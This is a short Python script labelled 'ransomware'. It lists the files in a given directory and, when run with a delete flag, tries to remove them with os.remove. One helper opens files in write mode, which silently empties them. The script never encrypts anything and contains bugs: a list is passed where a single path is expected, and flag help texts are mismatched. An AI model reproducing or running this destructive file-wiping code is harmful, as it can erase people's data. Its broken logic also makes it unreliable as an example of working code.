"""ransomware"""

import os 
import argparse

os.system(command="cls")

def get_files(path: str):
    """Get Files Function."""

    file_items = []

    if path is None:
        return file_items

    path = path.strip()

    if path == "":
        return file_items

    if not os.path.exists(path=path):
        return file_items

    if os.path.isfile(path=path):
        file_items.append(path)
        return file_items

    items = os.listdir(path=path)

    for item in items:
        path_item = os.path.join(path, item)
        if os.path.isfile(path=path_item):
            file_items.append(path_item)

    return file_items


def get_all_files(path: str):
    """Get All Files Function."""

    file_items = []

    if path is None:
        return file_items

    path = path.strip()

    if path == "":
        return file_items

    if not os.path.exists(path=path):
        return file_items

    if os.path.isfile(path=path):
        file_items.append(path)
        return file_items

    for path, _, files in os.walk(top=path):
        path_items = [os.path.join(path, file) for file in files]
        file_items.extend(path_items)

    return file_items

def print_file_content(path: str):
    """Print File Content Function"""

    if not os.path.exists(path=path):
        return

    if not os.path.isfile(path=path):
        return

    with open(file=path, mode="rt", encoding="utf-8") as file:
        file_content = file.read()
        print(file_content)


def print_copy_file_content(path: str):
    """Print Copy File Content Function"""

    if not os.path.exists(path=path):
        return

    if not os.path.isfile(path=path):
        return

    with open(file=path, mode="wt", encoding="utf-8") as file:
        copy_file_contant = file.write
        print(copy_file_contant)


def main():
    """Main Function."""

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "path",
        help="The path to the corresponding directory",
    )

    parser.add_argument(
        "-r",
        "----recursive",
        help="Display the file content",
        action="store_true",
    )

    parser.add_argument(
        "-d",
        "--delete",
        help="delete primary files",
        action="store_true",
    )

    args = parser.parse_args()

    path = args.path
    print("Path:", path)

    recursive = args.recursive
    print("recursive:", recursive)

    delete = args.delete
    print("delete:", delete)

    if not os.path.exists(path=path):
        print("[!] Invalid path!")
        quit()

    if not os.path.isdir(s=path):
        print("[!] path must not be a file!")
        quit()

    if recursive:
        files = get_all_files(path=path)
    else:
        files = get_files(path=path)

    for file in files:
        print(file)
        if delete:
            os.remove(files)
        

if __name__ == "__main__":
    main()       
        

 